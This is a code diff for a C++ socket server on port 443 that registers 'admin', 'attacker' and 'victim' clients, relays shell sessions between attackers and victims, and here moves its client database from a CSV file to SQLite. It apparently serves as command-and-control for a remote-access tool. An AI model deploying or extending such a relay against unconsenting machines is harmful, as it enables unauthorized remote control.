@@ -7,11 +7,19 @@
 
 Server::Server()
 {
-	outputLog("");
-	outputLog("loaded " + std::to_string(loadDatabase()) + " hId datapoint(s) from file");
+	int state = initializeDatabase();
+	if (state == -1) {
+		printLog("failed to open database");
+		std::exit(-1);
+	}
+	printLog("");
+	printLog("loaded " + std::to_string(state) + " hId datapoint(s) from file");
+
+	//const char* sql = "DELETE FROM clients WHERE hId = '80EA4B83C6681BA24B78E81180C99828A616C18E';";
+	//sqlite3_exec(db, sql, nullptr, nullptr, nullptr);
 
 	if (listener.listen(443) != sf::Socket::Status::Done) {
-		outputLog("failed to listen on port 443");
+		printLog("failed to listen on port 443");
 		std::exit(-1);
 	}
 	selector.add(listener);
@@ -20,11 +28,11 @@ Server::Server()
 		const auto& pub = sf::IpAddress::getPublicAddress();
 		const auto& priv = sf::IpAddress::getLocalAddress();
 		const auto& port = std::to_string(listener.getLocalPort());
-		outputLog("listening on port " + port + " (" + 
+		printLog("listening on port " + port + " (" + 
 			priv.value().toString() + " / " + pub.value().toString() + ")");
 	}
 	catch (std::exception& e) {
-		outputLog(e.what());
+		printLog(e.what());
 		std::exit(-2);
 	}
 	
@@ -46,12 +54,12 @@ int Server::processIncoming()
 		}
 	}
 	catch (std::exception& e) {
-		outputLog("awake checks: " + std::string(e.what()));
+		printLog("awake checks: " + std::string(e.what()));
 	}
 
 	//wait for the selector to be ready
 	if (!selector.wait(sf::seconds(1))) {
-		sf::sleep(sf::milliseconds(1));
+		sf::sleep(sf::milliseconds(1000));
 
 		if (needSendClientList)
 			sendClientList();
@@ -65,7 +73,7 @@ int Server::processIncoming()
 			acceptIncoming();
 	}
 	catch (std::exception& e) {
-		outputLog("accept incoming: " + std::string(e.what()));
+		printLog("accept incoming: " + std::string(e.what()));
 	}
 
 	//listen for client communication
@@ -80,48 +88,46 @@ int Server::processIncoming()
 		}
 	}
 	catch (std::exception& e) {
-		outputLog("handle communication: " + std::string(e.what()));
+		printLog("handle communication: " + std::string(e.what()));
 	}
 
 	//listen for initialization attempts
-	std::set<uint16_t> initializedIds, idsToRemove;
 	try {
-		for (auto& [id, u] : uninitialized) {
-			if (!selector.isReady(*u.socket))
+		for (size_t i = 0; i < uninitialized.size(); ) {
+			if (!selector.isReady(*uninitialized[i].socket)) {
+				++i;
 				continue;
+			}
 
-			auto code = initializeClient(id, u);
-			if (code == 1)
-				initializedIds.insert(id);
-			else if (code == 2)
-				idsToRemove.insert(id);
+			auto status = initializeClient(uninitialized[i]);
+			if (!status.first) {
+				++i;
+				continue;
+			}
+
+			if (status.second != 0)
+				clients[status.second] = std::move(uninitialized[i]);
+			else {
+				selector.remove(*uninitialized[i].socket);
+				delete uninitialized[i].socket;
+			}
+
+			uninitialized.erase(uninitialized.begin() + i);
+			needSendClientList = true;
 		}
 	}
 	catch (std::exception& e) {
-		outputLog("initialize clients: " + std::string(e.what()));
+		printLog("initialize clients: " + std::string(e.what()));
 	}
 	
 	//disconnect/ban all clients that need to
 	try {
-		//disconnect uninitialized clients
-		for (const auto& id : idsToRemove) {
-			selector.remove(*uninitialized[id].socket);
-			delete uninitialized[id].socket;
-
-			uninitialized.erase(id);
-		}
-		//initilize initialized clients
-		for (const auto& id : initializedIds) {
-			clients[id] = std::move(uninitialized[id]);
-
-			uninitialized.erase(id);
-		}
 		//add banned clients to the kill list
 		for (const auto& hId : bannedHIds) {
 			for (auto& [id, c] : clients) {
 				//check if client needs to be killed
 				if (c.hId == hId && c.isAttacker && !c.isAdmin) {
-					outputLog("attacker banned (" + std::to_string(id) + ")");
+					printLog("attacker banned (" + std::to_string(id) + ")");
 					idsToDisconnect.insert(id);
 				}
 			}
@@ -131,11 +137,10 @@ int Server::processIncoming()
 			disconnectClient(id);
 	}
 	catch (std::exception& e) {
-		outputLog("clients disconnect: " + std::string(e.what()));
+		printLog("clients disconnect: " + std::string(e.what()));
 	}		
-	
-	if (idsToRemove.size() > 0 || initializedIds.size() > 0 || 
-		bannedHIds.size() > 0 || idsToDisconnect.size() > 0 || needSendClientList)
+
+	if (bannedHIds.size() > 0 || idsToDisconnect.size() > 0 || needSendClientList)
 		sendClientList();
 
 	return 0;
@@ -143,8 +148,6 @@ int Server::processIncoming()
 
 bool Server::performAwakeCheck()
 {
-	bool needSendClientList = false;
-
 	std::set<uint16_t> idsSleeping;
 	for (auto& [id, c] : clients) {
 		if (!c.isAwake)
@@ -153,30 +156,23 @@ bool Server::performAwakeCheck()
 			c.isAwake = false;
 	}
 	for (auto id : idsSleeping) {
-		outputLog("client timed out (" + std::to_string(id) + ")");
+		printLog("client timed out (" + std::to_string(id) + ")");
 		disconnectClient(id);
-
-		needSendClientList = true;
 	}
 
-	idsSleeping.clear();
-	for (auto& [id, u] : uninitialized) {
-		if (!u.isAwake)
-			idsSleeping.insert(id);
-		else
-			u.isAwake = false;
-	}
-	for (auto id : idsSleeping) {
-		outputLog("uninitialized client timed out (" + std::to_string(id) + ")");
-
-		selector.remove(*uninitialized[id].socket);
-		delete uninitialized[id].socket;
-		uninitialized.erase(id);
-
-		needSendClientList = true;
+	for (size_t i = 0; i < uninitialized.size(); ) {
+		if (!uninitialized[i].isAwake) {
+			selector.remove(*uninitialized[i].socket);
+			delete uninitialized[i].socket;
+			uninitialized.erase(uninitialized.begin() + i);
+		}
+		else {
+			uninitialized[i].isAwake = false;
+			i++;
+		}
 	}
 
-	return needSendClientList;
+	return !idsSleeping.empty();
 }
 void Server::acceptIncoming()
 {
@@ -185,13 +181,12 @@ void Server::acceptIncoming()
 
 	//client accepted successfully
 	if (listener.accept(*c.socket) == sf::Socket::Status::Done) {
-		auto id = nextId++;
-		uninitialized[id] = c;
+		uninitialized.push_back(c);
 		selector.add(*c.socket);
 
-		outputLog("new connection (" + std::to_string(id) + ") = " +
-			c.socket->getRemoteAddress().value().toString() + ":" +
-			std::to_string(c.socket->getRemotePort()));
+		printLog("new connection = " +
+			c.socket->getRemoteAddress().value().toString() + 
+			":" + std::to_string(c.socket->getRemotePort()), true);
 	}
 	//failed to accept client 
 	else
@@ -204,36 +199,34 @@ void Server::handleCommunication(const uint16_t& id, Client& c,
 	auto status = c.socket->receive(p);
 	//forget disconnected client
 	if (status == sf::Socket::Status::Disconnected) {
-		outputLog("client disconnected (" + std::to_string(id) + ")");
+		printLog("handleCommunication: client disconnected (" + std::to_string(id) + ")");
 		idsToDisconnect.insert(id);
 		return;
 	}
 	else if (status != sf::Socket::Status::Done) {
-		outputLog("code " + std::to_string(int(status)));
+		printLog("code " + std::to_string(int(status)));
 		return;
 	}
 
 	auto cmd = handlePacket(p, id, c, bannedHIds, idsToDisconnect);
 	if (cmd != 0)
-		outputLog("failed to process cmd " + std::to_string(cmd) + " from id " + std::to_string(id));
+		printLog("handleCommunication: failed to process cmd " + std::to_string(cmd) + " from id " + std::to_string(id));
 	else
 		c.isAwake = true;
 
 }
-short Server::initializeClient(const uint16_t& id, Client& u)
+//bool = whether full packet was received, uint16_t = 0 if error, else id assigned
+std::pair<bool, uint16_t> Server::initializeClient(Client& u)
 {
 	sf::Packet p;
 	u.socket->setBlocking(false);
 	auto status = u.socket->receive(p);
 	u.socket->setBlocking(true);
 
-	//forget disconnected client
-	if (status == sf::Socket::Status::Disconnected) {
-		outputLog("uninitialized client disconnected (" + std::to_string(id) + ")");
-		return 2;
-	}
+	if (status == sf::Socket::Status::Partial)
+		return std::pair<bool, uint16_t>(false, 0);
 	if (status != sf::Socket::Status::Done)
-		return 0;
+		return std::pair<bool, uint16_t>(true, 0);
 
 	std::uint16_t reqId;
 	std::uint8_t cmd;
@@ -242,34 +235,42 @@ short Server::initializeClient(const uint16_t& id, Client& u)
 
 	u.isAwake = true;
 	bool isRouge = false;
-	if (ver.size() < 3)
+	if (ver.size() < 3 || hId.size() != 40)
 		isRouge = true;
 	else if (ver[0] != '#' || ver.back() != '#')
 		isRouge = true;
 	if (isRouge) {
-		outputLog("uninitialized client gone rogue (" + std::to_string(id) + ")");
-		return 2;
+		printLog("uninitialized client gone rogue", true);
+		return std::pair<bool, uint16_t>(true, 0);
 	}
 
 	//TODO: handle client version
+
+	if (database.find(hId) == database.end())
+		database[hId] = HIdInfo();
+
+	sqlite3_stmt* stmt;
+	sqlite3_prepare_v2(db, "INSERT INTO clients (hId, name, isBanned) VALUES (?, '', 0);", -1, &stmt, nullptr);
+	sqlite3_bind_text(stmt, 1, hId.c_str(), -1, SQLITE_TRANSIENT);
+	sqlite3_step(stmt);
+	sqlite3_finalize(stmt);
 
 	//accept admin
 	if (cmd == std::uint8_t(Cmd::REGISTER_ADMIN)) {
 		std::string pw;
 		p >> pw;
-		if (database.find(hId) == database.end())
-			database[hId] = HIdInfo();
 
 		//password is correct
-		if (pw == adminPass) {
+		if (pw == adminPassword) {
+			auto id = nextId++;
 			sf::Packet res;
 			res << reqId << bool(true) << uint16_t(id);
 			auto _ = u.socket->send(res);
 
 			u.isAttacker = true, u.isAdmin = true, u.hId = hId;
 
-			outputLog(std::to_string(id) + " = admin: " + hId);
-			return 1;
+			printLog(std::to_string(id) + " = admin: " + hId);
+			return std::pair<bool, uint16_t>(true, id);
 		}
 		//password is not correct
 		else {
@@ -277,25 +278,23 @@ short Server::initializeClient(const uint16_t& id, Client& u)
 			res << reqId << bool(false);
 			auto _ = u.socket->send(res);
 
-			outputLog("failed admin login (" + std::to_string(id) + ")");
-			return 2;
+			printLog(hId + ", failed admin login");
+			return std::pair<bool, uint16_t>(true, 0);
 		}
 	}
 	//accept attacker
 	else if (cmd == std::uint8_t(Cmd::REGISTER_ATTACKER)) {
-		if (database.find(hId) == database.end())
-			database[hId] = HIdInfo();
-
 		//access granted
 		if (!database[hId].isBanned) {
+			auto id = nextId++;
 			sf::Packet res;
 			res << reqId << bool(true) << uint16_t(id);
 			auto _ = u.socket->send(res);
 
 			u.isAttacker = true, u.hId = hId;
 
-			outputLog(std::to_string(id) + " = attacker: " + hId);
-			return 1;
+			printLog(std::to_string(id) + " = attacker: " + hId);
+			return std::pair<bool, uint16_t>(true, id);
 		}		
 		//client is banned (access denied)
 		else {
@@ -303,28 +302,26 @@ short Server::initializeClient(const uint16_t& id, Client& u)
 			res << reqId << bool(false);
 			auto _ = u.socket->send(res);
 
-			outputLog("banned client (" + std::to_string(id) + "): " + hId);
-			return 2;
+			printLog("banned client: " + hId);
+			return std::pair<bool, uint16_t>(true, 0);
 		}
 	}
 	//accept victim
 	else if (cmd == std::uint8_t(Cmd::REGISTER_VICTIM)) {
-		if (database.find(hId) == database.end())
-			database[hId] = HIdInfo();
-
+		auto id = nextId++;
 		sf::Packet res;
 		res << reqId << bool(true) << uint16_t(id);
 		auto _ = u.socket->send(res);
 
 		u.isAttacker = false, u.hId = hId;
 
-		outputLog(std::to_string(id) + " = victim: " + hId);
-		return 1;
+		printLog(std::to_string(id) + " = victim: " + hId);
+		return std::pair<bool, uint16_t>(true, id);
 	}
 	//unknown first command
 	else {
-		outputLog("uninitialized client gone rogue (" + std::to_string(id) + ")");
-		return 2;
+		printLog("uninitialized client gone rogue");
+		return std::pair<bool, uint16_t>(true, 0);
 	}
 }
 
@@ -335,7 +332,7 @@ uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
 	uint8_t cmd;
 	p >> reqId >> cmd;
 
-	if (cmd == uint8_t(Cmd::PING)) 
+	if (cmd == uint8_t(Cmd::PING))
 		return 0;
 	//stop ssh
 	else if (cmd == uint8_t(Cmd::END_SSH)) {
@@ -347,7 +344,9 @@ uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
 		res << uint16_t(0) << uint8_t(Cmd::END_SSH);
 		auto _ = clients[c.sshId].socket->send(res);
 
-		clients[c.sshId].sshId = 0;
+		//defensive check that peer still exists
+		if (clients.find(c.sshId) != clients.end())
+			clients[c.sshId].sshId = 0;
 		c.sshId = 0;
 		return 0;
 	}
@@ -373,6 +372,14 @@ uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
 		p >> hId >> name;
 		if (c.isAdmin && database.find(hId) != database.end()) {
 			database[hId].name = name;
+			
+			sqlite3_stmt* stmt;
+			sqlite3_prepare_v2(db, "UPDATE clients SET name = ? WHERE hId = ?;", -1, &stmt, nullptr);
+			sqlite3_bind_text(stmt, 1, name.c_str(), -1, SQLITE_TRANSIENT);
+			sqlite3_bind_text(stmt, 2, hId.c_str(), -1, SQLITE_TRANSIENT);
+			sqlite3_step(stmt);
+			sqlite3_finalize(stmt);
+
 			sendClientList();
 		}
 	}
@@ -384,6 +391,13 @@ uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
 		if (c.isAdmin && database.find(hId) != database.end()) {
 			if (!database[hId].isBanned) {
 				database[hId].isBanned = true;
+				
+				sqlite3_stmt* stmt;
+				sqlite3_prepare_v2(db, "UPDATE clients SET isBanned = 1 WHERE hId = ?;", -1, &stmt, nullptr);
+				sqlite3_bind_text(stmt, 1, hId.c_str(), -1, SQLITE_TRANSIENT);
+				sqlite3_step(stmt);
+				sqlite3_finalize(stmt);
+
 				bannedHIds.insert(hId);
 			}
 		}
@@ -396,28 +410,28 @@ uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
 		if (c.isAdmin && database.find(hId) != database.end()) {
 			if (database[hId].isBanned) {
 				database[hId].isBanned = false;
+				
+				sqlite3_stmt* stmt;
+				sqlite3_prepare_v2(db, "UPDATE clients SET isBanned = 0 WHERE hId = ?;", -1, &stmt, nullptr);
+				sqlite3_bind_text(stmt, 1, hId.c_str(), -1, SQLITE_TRANSIENT);
+				sqlite3_step(stmt);
+				sqlite3_finalize(stmt);
+
 				sendClientList();
 			}
 		}
 	}
 	//kill client
 	else if (cmd == uint8_t(Cmd::KILL)) {
-		uint16_t id;
-		p >> id;
+		uint16_t targetId;
+		p >> targetId;
 
-		if (c.isAdmin && clients.find(id) != clients.end() && !clients[id].isAdmin) {
-			outputLog("client killed (" + std::to_string(id) + ")");
+		// only admins may kill non-admin clients; mark for disconnect
+		if (c.isAdmin && clients.find(targetId) != clients.end() && !clients[targetId].isAdmin) {
+			printLog("client killed (" + std::to_string(targetId) + ")");
+			// mark for removal later by processIncoming
+			idsToDisconnect.insert(targetId);
 		}
-	}
-	//save database to file
-	else if (cmd == uint8_t(Cmd::SAVE_DATASET)) {
-		if (!c.isAdmin)
-			return cmd;
-
-		saveDatabase();
-		sf::Packet res;
-		res << reqId;
-		auto _ = c.socket->send(res);
 	}
 	//start ssh
 	else if (cmd == uint8_t(Cmd::START_SSH)) {
@@ -460,7 +474,7 @@ uint8_t Server::handlePacket(sf::Packet& p, const uint16_t& id, Client& c,
 	}
 	//unkown command
 	else {
-		outputLog("unknown command (" + std::to_string(id)
+		printLog("unknown command (" + std::to_string(id)
 			+ "): " + std::to_string(int(cmd)));
 	}
 
@@ -496,58 +510,79 @@ void Server::sendClientList() const
 }
 void Server::disconnectClient(uint16_t id)
 {
-	if (clients.find(id) == clients.end()) {
-		outputLog("disconnectClient: client not found (" + std::to_string(id) + ")");
+	auto it = clients.find(id);
+	if (it == clients.end()) {
+		printLog("disconnectClient: client not found (" + std::to_string(id) + ")");
 		return;
 	}
 
 	//notify paired client about the disconnection
-	if (clients[id].sshId != 0 && clients.find(clients[id].sshId) != clients.end()) {
-		sf::Packet res;
-		res << uint16_t(0) << uint8_t(Cmd::END_SSH);
-		auto _ = clients[clients[id].sshId].socket->send(res);
-		clients[clients[id].sshId].sshId = 0;
+	if (it->second.sshId != 0) {
+		auto peerIt = clients.find(it->second.sshId);
+		if (peerIt != clients.end()) {
+			sf::Packet res;
+			res << uint16_t(0) << uint8_t(Cmd::END_SSH);
+			//try to send; ignore result but log failure
+			if (peerIt->second.socket->send(res) != sf::Socket::Status::Done)
+				printLog("failed sending END_SSH to paired client (" + std::to_string(peerIt->first) + ")");
+			peerIt->second.sshId = 0;
+		}
 	}
 
-	selector.remove(*clients[id].socket);
-	delete clients[id].socket;
+	if (it->second.socket != nullptr) {
+		selector.remove(*it->second.socket);
+		it->second.socket->disconnect();
+		delete it->second.socket;
+		it->second.socket = nullptr;
+	}
 
-	clients.erase(id);
+	clients.erase(it);
 }
 
-int Server::loadDatabase()
+int Server::initializeDatabase()
 {
-	std::fstream create(databasePath, std::ios::app);
-	create.close();
+	int rc = sqlite3_open(databasePath.c_str(), &db);
+	if (rc) {
+		printLog("can't open database: " + std::string(sqlite3_errmsg(db)));
+		return -1;
+	}
 
+	sqlite3_exec(db, "PRAGMA synchronous = FULL;", nullptr, nullptr, nullptr);
+
+	//if not table exixts, create a teble with hId (str), name (str), isBanned (bool)
+	const char* sql1 = "CREATE TABLE IF NOT EXISTS clients (hId TEXT PRIMARY KEY, name TEXT, isBanned INTEGER);";
+	char* errMsg = nullptr;
+	rc = sqlite3_exec(db, sql1, nullptr, nullptr, &errMsg);
+	if (rc != SQLITE_OK) {
+		printLog("SQL error: " + std::string(errMsg));
+		sqlite3_free(errMsg);
+		return -1;
+	}
+
+	//extract data and populate in-memory database
 	int num = 0;
-	std::ifstream file(databasePath);
+	const char* sql2 = "SELECT hId, name, isBanned FROM clients;";
+	sqlite3_stmt* stmt;
 
-	std::string line = "";
-	while (getline(file, line)) {
-		if (line.find(',') == std::string::npos)
-			continue;
+	if (sqlite3_prepare_v2(db, sql2, -1, &stmt, nullptr) != SQLITE_OK) {
+		printLog("SELECT prepare failed: " + std::string(sqlite3_errmsg(db)));
+		return -1;
+	}
 
+	while (sqlite3_step(stmt) == SQLITE_ROW) {
 		HIdInfo hIdInfo;
-		std::string hId = line.substr(0, line.find_first_of(','));
-		line = line.substr(line.find_first_of(',') + 1);
-		hIdInfo.name = line.substr(0, line.find_first_of(','));
-		line = line.substr(line.find_first_of(',') + 1);
-		std::istringstream(line) >> hIdInfo.isBanned;
+		auto cstr1 = sqlite3_column_text(stmt, 0);
+		std::string hId = cstr1 ? reinterpret_cast<const char*>(cstr1) : "";
+
+		auto cstr2 = sqlite3_column_text(stmt, 1);
+		hIdInfo.name = cstr2 ? reinterpret_cast<const char*>(cstr2) : "";
+
+		hIdInfo.isBanned = sqlite3_column_int(stmt, 2);
 
 		database[hId] = hIdInfo;
 		num++;
 	}
-	file.close();
+	sqlite3_finalize(stmt);
 
 	return num;
-}
-void Server::saveDatabase() const
-{
-	std::ofstream file(databasePath, std::ios::trunc);
-	
-	for (auto& [hId, info] : database)
-		file << hId << "," << info.name << "," << info.isBanned << "\n";
-	
-	file.close();
 }
